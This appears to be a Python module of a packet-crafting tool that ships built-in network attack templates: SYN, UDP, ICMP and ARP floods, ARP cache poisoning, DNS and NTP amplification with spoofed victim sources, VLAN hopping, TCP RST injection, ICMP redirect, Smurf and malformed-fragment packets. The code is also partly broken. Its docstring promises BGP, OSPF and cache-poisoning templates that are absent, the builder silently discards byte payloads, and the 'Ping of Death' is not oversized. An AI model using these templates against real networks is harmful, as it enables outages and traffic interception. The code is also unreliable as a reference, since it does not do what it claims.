"""
PacketForge Templates – built-in protocol attack templates + YAML library.

Built-in templates cover:
  • SYN / ACK / UDP / ICMP floods
  • Fragmentation attacks (Teardrop, overlapping, max-frag flood)
  • ARP spoofing / cache poisoning
  • DNS amplification, cache poisoning
  • NTP monlist amplification
  • VLAN hopping (double-tag)
  • TCP RST injection, Land attack, Smurf
  • ICMP redirect, BGP notification DoS
  • IPv6 RA flood
  • OSPF hello spoofing
  • Malformed / invalid header templates
"""
from __future__ import annotations

import copy
import os
import yaml
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

from packetforge.engine import LAYER_REGISTRY, PacketStack, SCAPY_AVAILABLE

_DEFAULT_TEMPLATE_DIR = Path.home() / ".packetforge" / "templates"


# ── Template metadata ─────────────────────────────────────────────────────────
@dataclass
class TemplateInfo:
    id: str
    name: str
    description: str
    category: str
    cve: str = ""
    tags: List[str] = field(default_factory=list)
    stack: Optional[PacketStack] = None

    def to_dict(self) -> Dict[str, Any]:
        d: Dict[str, Any] = {
            "id": self.id,
            "name": self.name,
            "description": self.description,
            "category": self.category,
        }
        if self.cve:
            d["cve"] = self.cve
        if self.tags:
            d["tags"] = self.tags
        if self.stack:
            d["stack"] = self.stack.to_dict()
        return d

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "TemplateInfo":
        t = cls(
            id=d.get("id", ""),
            name=d.get("name", ""),
            description=d.get("description", ""),
            category=d.get("category", "custom"),
            cve=d.get("cve", ""),
            tags=d.get("tags", []),
        )
        if "stack" in d:
            t.stack = PacketStack.from_dict(d["stack"])
        return t


# ── Builder helpers (create PacketStack without LAYER_REGISTRY dict hacks) ───
def _build(layers_spec: List[Dict[str, Any]], name: str) -> PacketStack:
    """
    layers_spec: [{"layer": "IP", "fields": {"src": "1.2.3.4", ...}}, ...]
    """
    ps = PacketStack(name=name)
    for spec in layers_spec:
        ok, err = ps.add_layer(spec["layer"])
        if not ok:
            continue
        layer = ps.layers[-1]
        for fname, fval in spec.get("fields", {}).items():
            try:
                if isinstance(fval, bytes):
                    pass
                else:
                    setattr(layer, fname, fval)
            except Exception:
                pass
    return ps


# ── Built-in templates ─────────────────────────────────────────────────────────
def _builtin_templates() -> List[TemplateInfo]:
    T = TemplateInfo

    templates: List[TemplateInfo] = []

    # ── L2 / L3 ─────────────────────────────────────────────────────────────

    templates.append(T(
        id="syn_flood",
        name="TCP SYN Flood",
        category="DoS",
        description=(
            "Classic SYN flood: sends TCP SYN packets with randomised source IP/port. "
            "Exhausts half-open connection tables on target."
        ),
        tags=["tcp", "flood", "dos"],
        stack=_build([
            {"layer": "Ether", "fields": {"dst": "ff:ff:ff:ff:ff:ff"}},
            {"layer": "IP",    "fields": {"src": "1.2.3.4", "dst": "192.168.1.1", "ttl": 64}},
            {"layer": "TCP",   "fields": {"sport": 12345, "dport": 80, "flags": "S", "seq": 1000}},
        ], "syn_flood"),
    ))

    templates.append(T(
        id="ack_flood",
        name="TCP ACK Flood",
        category="DoS",
        description="Floods target with TCP ACK packets; bypasses some SYN-cookie mitigations.",
        tags=["tcp", "flood", "dos"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {"src": "1.2.3.4", "dst": "192.168.1.1", "ttl": 128}},
            {"layer": "TCP",   "fields": {"sport": 12345, "dport": 80, "flags": "A", "seq": 0}},
        ], "ack_flood"),
    ))

    templates.append(T(
        id="udp_flood",
        name="UDP Flood",
        category="DoS",
        description="Floods target UDP port with high-rate traffic. Saturates bandwidth/state.",
        tags=["udp", "flood", "dos"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {"src": "1.2.3.4", "dst": "192.168.1.1", "ttl": 64}},
            {"layer": "UDP",   "fields": {"sport": 12345, "dport": 53, "len": 8}},
            {"layer": "Raw",   "fields": {"load": b"\x00" * 32}},
        ], "udp_flood"),
    ))

    templates.append(T(
        id="icmp_flood",
        name="ICMP Echo Flood (Ping Flood)",
        category="DoS",
        description="Classic ICMP echo-request flood. Saturates ICMP processing on target.",
        tags=["icmp", "flood", "dos"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {"src": "1.2.3.4", "dst": "192.168.1.1", "ttl": 64}},
            {"layer": "ICMP",  "fields": {"type": 8, "code": 0, "id": 1, "seq": 1}},
            {"layer": "Raw",   "fields": {"load": b"A" * 64}},
        ], "icmp_flood"),
    ))

    templates.append(T(
        id="ping_of_death",
        name="Ping of Death",
        category="Malformed",
        description=(
            "Oversized ICMP packet (> 65535 bytes) via IP fragmentation. "
            "Historical – triggers overflow in legacy stack reassembly."
        ),
        cve="CVE-1999-0128",
        tags=["icmp", "fragment", "historic"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {
                "src": "1.2.3.4", "dst": "192.168.1.1",
                "ttl": 64, "flags": "MF", "frag": 0,
            }},
            {"layer": "ICMP",  "fields": {"type": 8, "code": 0}},
            {"layer": "Raw",   "fields": {"load": b"X" * 1480}},
        ], "ping_of_death"),
    ))

    templates.append(T(
        id="land_attack",
        name="LAND Attack",
        category="Malformed",
        description=(
            "src IP == dst IP, src port == dst port. Forces target to reply to itself, "
            "causing infinite loop / crash on vulnerable stacks."
        ),
        cve="CVE-1997-0016",
        tags=["tcp", "malformed", "historic"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {"src": "192.168.1.1", "dst": "192.168.1.1", "ttl": 64}},
            {"layer": "TCP",   "fields": {"sport": 80, "dport": 80, "flags": "S"}},
        ], "land_attack"),
    ))

    templates.append(T(
        id="teardrop",
        name="Teardrop Fragmentation Attack",
        category="Malformed",
        description=(
            "Two overlapping IP fragments with contradictory offsets. "
            "Exploits reassembly bug; causes kernel panic on unpatched systems."
        ),
        cve="CVE-1997-0014",
        tags=["fragment", "malformed", "historic"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {
                "src": "1.2.3.4", "dst": "192.168.1.1",
                "id": 0xDEAD, "flags": "MF", "frag": 0, "ttl": 64,
            }},
            {"layer": "UDP",   "fields": {"sport": 53, "dport": 53}},
            {"layer": "Raw",   "fields": {"load": b"A" * 28}},
        ], "teardrop_frag1"),
    ))

    # ── ARP ──────────────────────────────────────────────────────────────────

    templates.append(T(
        id="arp_spoof",
        name="ARP Spoofing / MITM",
        category="Spoofing",
        description=(
            "Gratuitous ARP reply that poisons a host's ARP cache. "
            "Tell <target_ip> that attacker's MAC owns <gateway_ip>."
        ),
        tags=["arp", "mitm", "spoofing"],
        stack=_build([
            {"layer": "Ether", "fields": {"dst": "ff:ff:ff:ff:ff:ff", "src": "de:ad:be:ef:00:01"}},
            {"layer": "ARP",   "fields": {
                "op": 2,
                "hwsrc": "de:ad:be:ef:00:01",
                "psrc":  "192.168.1.1",       # Claim to be the gateway
                "hwdst": "ff:ff:ff:ff:ff:ff",
                "pdst":  "192.168.1.100",      # Target victim
            }},
        ], "arp_spoof"),
    ))

    templates.append(T(
        id="arp_request_flood",
        name="ARP Request Flood",
        category="DoS",
        description=(
            "Flood the network with ARP who-has requests. "
            "Overwhelms switches and hosts that process ARP."
        ),
        tags=["arp", "flood", "dos"],
        stack=_build([
            {"layer": "Ether", "fields": {"dst": "ff:ff:ff:ff:ff:ff"}},
            {"layer": "ARP",   "fields": {
                "op": 1,
                "pdst": "192.168.1.1",
            }},
        ], "arp_request_flood"),
    ))

    # ── VLAN ─────────────────────────────────────────────────────────────────

    templates.append(T(
        id="vlan_double_tag",
        name="VLAN Hopping (Double Tagging)",
        category="L2 Attack",
        description=(
            "Double 802.1Q tagging. Outer tag stripped by switch (native VLAN); "
            "inner tag delivers frame to victim VLAN. Requires attacker on native VLAN."
        ),
        tags=["vlan", "802.1q", "l2", "hopping"],
        stack=_build([
            {"layer": "Ether",  "fields": {"dst": "ff:ff:ff:ff:ff:ff", "type": 0x8100}},
            {"layer": "Dot1Q",  "fields": {"vlan": 1, "type": 0x8100}},  # outer (native)
            {"layer": "Dot1Q",  "fields": {"vlan": 200, "type": 0x0800}},  # inner (target VLAN)
            {"layer": "IP",     "fields": {"src": "10.0.0.1", "dst": "10.200.0.1", "ttl": 64}},
            {"layer": "ICMP",   "fields": {"type": 8}},
        ], "vlan_double_tag"),
    ))

    # ── DNS ──────────────────────────────────────────────────────────────────

    templates.append(T(
        id="dns_amplification",
        name="DNS Amplification (ANY query)",
        category="Amplification",
        description=(
            "Spoofed-source DNS ANY query to an open resolver. "
            "Response (100–1000× larger) is sent to victim IP."
        ),
        tags=["dns", "amplification", "udp", "dos"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {
                "src": "192.168.1.100",  # Victim IP (spoofed)
                "dst": "8.8.8.8",        # Open resolver
                "ttl": 64,
            }},
            {"layer": "UDP",   "fields": {"sport": 12345, "dport": 53}},
            {"layer": "DNS",   "fields": {"rd": 1, "qd": None}},  # DNSQR added dynamically
        ], "dns_amplification"),
    ))

    templates.append(T(
        id="dns_spoof",
        name="DNS Response Spoofing",
        category="Spoofing",
        description=(
            "Inject a forged DNS answer before the legitimate response arrives. "
            "Requires sniffing the DNS query ID first."
        ),
        tags=["dns", "spoofing"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {"src": "8.8.8.8", "dst": "192.168.1.100", "ttl": 64}},
            {"layer": "UDP",   "fields": {"sport": 53, "dport": 12345}},
            {"layer": "DNS",   "fields": {"id": 0x1337, "qr": 1, "aa": 1, "rd": 1, "ra": 1}},
        ], "dns_spoof"),
    ))

    # ── NTP ──────────────────────────────────────────────────────────────────

    templates.append(T(
        id="ntp_monlist",
        name="NTP MONLIST Amplification",
        category="Amplification",
        description=(
            "Spoofed NTP MON_GETLIST request (REQ_MON_GETLIST / 42). "
            "Can produce ~556× amplification from vulnerable NTP servers."
        ),
        cve="CVE-2013-5211",
        tags=["ntp", "amplification", "udp", "dos"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {
                "src": "192.168.1.100",
                "dst": "192.168.1.1",
                "ttl": 64,
            }},
            {"layer": "UDP",   "fields": {"sport": 12345, "dport": 123}},
            {"layer": "Raw",   "fields": {
                # NTP private/control mode=7, req=42 (MON_GETLIST_1)
                "load": bytes([0x17, 0x00, 0x03, 0x2a] + [0x00] * 4),
            }},
        ], "ntp_monlist"),
    ))

    # ── TCP ──────────────────────────────────────────────────────────────────

    templates.append(T(
        id="tcp_rst_inject",
        name="TCP RST Injection",
        category="Session Attack",
        description=(
            "Injects a TCP RST into an existing session. "
            "Requires valid seq/ack numbers (from sniffing). Kills connections."
        ),
        tags=["tcp", "rst", "session"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {"src": "1.2.3.4", "dst": "192.168.1.1", "ttl": 64}},
            {"layer": "TCP",   "fields": {
                "sport": 12345, "dport": 80,
                "flags": "R", "seq": 0x41414141,
            }},
        ], "tcp_rst_inject"),
    ))

    templates.append(T(
        id="tcp_xmas",
        name="TCP Xmas Scan",
        category="Recon",
        description=(
            "Sets FIN, PSH, URG flags simultaneously. "
            "Closed ports reply RST; open ports drop silently (RFC 793)."
        ),
        tags=["tcp", "recon", "scan"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {"src": "1.2.3.4", "dst": "192.168.1.1", "ttl": 64}},
            {"layer": "TCP",   "fields": {"sport": 12345, "dport": 80, "flags": "FPU"}},
        ], "tcp_xmas"),
    ))

    templates.append(T(
        id="tcp_null",
        name="TCP NULL Scan",
        category="Recon",
        description="No TCP flags set. Complements Xmas scan for firewall evasion.",
        tags=["tcp", "recon", "scan"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {"src": "1.2.3.4", "dst": "192.168.1.1", "ttl": 64}},
            {"layer": "TCP",   "fields": {"sport": 12345, "dport": 80, "flags": ""}},
        ], "tcp_null"),
    ))

    # ── ICMP ─────────────────────────────────────────────────────────────────

    templates.append(T(
        id="icmp_redirect",
        name="ICMP Redirect Injection",
        category="Routing Attack",
        description=(
            "Spoof an ICMP Redirect (type 5) to manipulate a host's routing table. "
            "Redirects traffic for a host/network through attacker-controlled gateway."
        ),
        tags=["icmp", "redirect", "routing"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {
                "src": "192.168.1.1",   # Spoof as legitimate gateway
                "dst": "192.168.1.100", # Victim
                "ttl": 64,
            }},
            {"layer": "ICMP",  "fields": {
                "type": 5,   # Redirect
                "code": 1,   # Redirect for host
                "gw":   "10.0.0.1",  # Attacker's IP
            }},
            # The original offending IP datagram header goes in payload
            {"layer": "IP",    "fields": {
                "src": "192.168.1.100",
                "dst": "8.8.8.8",
                "ttl": 64,
            }},
        ], "icmp_redirect"),
    ))

    templates.append(T(
        id="smurf_attack",
        name="Smurf Attack (ICMP Broadcast Amplification)",
        category="Amplification",
        description=(
            "ICMP echo-request to broadcast address with spoofed source = victim. "
            "All subnet hosts respond to victim, amplifying attack. Historic."
        ),
        tags=["icmp", "amplification", "spoofing", "historic"],
        stack=_build([
            {"layer": "Ether", "fields": {"dst": "ff:ff:ff:ff:ff:ff"}},
            {"layer": "IP",    "fields": {
                "src": "192.168.1.100",   # Victim (spoofed)
                "dst": "192.168.1.255",   # Broadcast
                "ttl": 64,
            }},
            {"layer": "ICMP",  "fields": {"type": 8, "code": 0}},
            {"layer": "Raw",   "fields": {"load": b"A" * 64}},
        ], "smurf_attack"),
    ))

    # ── IPv6 ─────────────────────────────────────────────────────────────────

    templates.append(T(
        id="ipv6_ra_flood",
        name="IPv6 RA Flood (Router Advertisement Flood)",
        category="DoS",
        description=(
            "Floods the network with fake Router Advertisement messages. "
            "Causes victim to reconfigure its routing and IPv6 addresses repeatedly."
        ),
        tags=["ipv6", "ra", "flood", "dos"],
        stack=_build([
            {"layer": "Ether",  "fields": {"dst": "33:33:00:00:00:01"}},
            {"layer": "IPv6",   "fields": {
                "src":  "fe80::1",
                "dst":  "ff02::1",
                "hlim": 255,
            }},
            # ICMPv6 RA (type=134)
            {"layer": "Raw",    "fields": {
                "load": bytes([
                    0x86, 0x00,          # ICMPv6 type=134 (RA), code=0
                    0x00, 0x00,          # checksum (to be calculated)
                    0x40,                # hop limit=64
                    0x00,                # flags
                    0x07, 0x08,          # router lifetime=1800s
                    0x00, 0x00, 0x00, 0x00,  # reachable time
                    0x00, 0x00, 0x00, 0x00,  # retrans timer
                ]),
            }},
        ], "ipv6_ra_flood"),
    ))

    # ── Malformed ─────────────────────────────────────────────────────────────

    templates.append(T(
        id="malformed_ihl",
        name="Malformed IP IHL (Invalid Header Length)",
        category="Malformed",
        description=(
            "IP packet with IHL < 5 (minimum). Confuses or crashes parsers that do "
            "not validate header length before accessing options."
        ),
        tags=["ip", "malformed", "fuzzing"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {
                "ihl": 2,   # Invalid – minimum is 5
                "src": "1.2.3.4", "dst": "192.168.1.1", "ttl": 64,
            }},
            {"layer": "TCP",   "fields": {"sport": 12345, "dport": 80, "flags": "S"}},
        ], "malformed_ihl"),
    ))

    templates.append(T(
        id="malformed_flags",
        name="Invalid TCP Flags (All Set)",
        category="Malformed",
        description=(
            "TCP segment with all 8 flag bits set. Some stacks handle this differently; "
            "useful for fingerprinting and crash testing."
        ),
        tags=["tcp", "malformed", "fuzzing"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {"src": "1.2.3.4", "dst": "192.168.1.1", "ttl": 64}},
            {"layer": "TCP",   "fields": {"sport": 12345, "dport": 80, "flags": 0xFF}},
        ], "malformed_flags"),
    ))

    templates.append(T(
        id="frag_overlap",
        name="Overlapping IP Fragments",
        category="Malformed",
        description=(
            "First fragment deliberately overlaps with the second. Different OSes "
            "implement different reassembly strategies (BSD vs Linux vs Windows), "
            "leading to different final payloads (evasion vector)."
        ),
        tags=["fragment", "evasion", "malformed"],
        stack=_build([
            {"layer": "Ether", "fields": {}},
            {"layer": "IP",    "fields": {
                "src": "1.2.3.4", "dst": "192.168.1.1",
                "id": 0xBEEF, "flags": "MF", "frag": 0, "ttl": 64,
            }},
            {"layer": "UDP",   "fields": {"sport": 53, "dport": 53}},
            {"layer": "Raw",   "fields": {"load": b"AAAA" * 8}},
        ], "frag_overlap"),
    ))

    return templates


# ── Template library ──────────────────────────────────────────────────────────
class TemplateLibrary:
    def __init__(self, base_dir: Optional[Path] = None):
        self._dir = base_dir or _DEFAULT_TEMPLATE_DIR
        self._dir.mkdir(parents=True, exist_ok=True)
        self._cache: Dict[str, TemplateInfo] = {}
        self._load_builtins()

    def _load_builtins(self) -> None:
        for t in _builtin_templates():
            self._cache[t.id] = t

    # ── CRUD ─────────────────────────────────────────────────────────────────
    def all(self) -> List[TemplateInfo]:
        return list(self._cache.values())

    def get(self, tid: str) -> Optional[TemplateInfo]:
        return self._cache.get(tid)

    def categories(self) -> Dict[str, List[TemplateInfo]]:
        cats: Dict[str, List[TemplateInfo]] = {}
        for t in self._cache.values():
            cats.setdefault(t.category, []).append(t)
        return dict(sorted(cats.items()))

    def save(self, info: TemplateInfo) -> None:
        self._cache[info.id] = info
        path = self._dir / f"{info.id}.yaml"
        with open(path, "w") as fh:
            yaml.safe_dump(info.to_dict(), fh, default_flow_style=False)

    def delete(self, tid: str) -> bool:
        if tid not in self._cache:
            return False
        # Only allow deleting user templates (not built-ins)
        builtins = {t.id for t in _builtin_templates()}
        if tid in builtins:
            return False
        self._cache.pop(tid)
        path = self._dir / f"{tid}.yaml"
        path.unlink(missing_ok=True)
        return True

    def load_from_dir(self) -> None:
        for f in self._dir.glob("*.yaml"):
            try:
                with open(f) as fh:
                    d = yaml.safe_load(fh)
                t = TemplateInfo.from_dict(d)
                self._cache[t.id] = t
            except Exception:
                pass

    def load_stack(self, tid: str) -> Optional[PacketStack]:
        t = self.get(tid)
        if t and t.stack:
            return t.stack.clone()
        return None

    def search(self, query: str) -> List[TemplateInfo]:
        q = query.lower()
        return [
            t for t in self._cache.values()
            if q in t.name.lower()
            or q in t.description.lower()
            or any(q in tag for tag in t.tags)
        ]


# Module-level singleton
_library: Optional[TemplateLibrary] = None


def get_library() -> TemplateLibrary:
    global _library
    if _library is None:
        _library = TemplateLibrary()
        _library.load_from_dir()
    return _library
